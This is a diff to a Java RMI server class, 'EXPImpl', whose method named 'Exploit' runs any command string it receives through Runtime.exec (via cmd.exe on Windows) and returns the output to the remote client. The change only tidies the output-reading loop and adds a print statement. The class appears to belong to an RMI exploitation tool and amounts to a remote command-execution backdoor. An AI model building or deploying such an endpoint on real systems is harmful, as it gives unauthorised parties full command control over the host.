@@ -14,22 +14,20 @@ public class EXPImpl extends UnicastRemoteObject implements EXP {
     @Override
     public String Exploit(String cmd) throws IOException {
 
+        System.out.println("This is Server do");
         Process p;
         String result="";
+        String disr;
         if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
             p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
         } else {
             p = Runtime.getRuntime().exec(cmd);
         }
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
-        String disr = bufferedReader.readLine();
-        String result2 = result;
-        while(disr != null){
-            String result3 = result2 + disr + "\n";
-            disr = bufferedReader.readLine();
-            result2 =result3;
+        while((disr=bufferedReader.readLine())!=null){
+            result += disr + "\n";
         }
-        return result2;
+        return result;//return to client
 
     }
 }
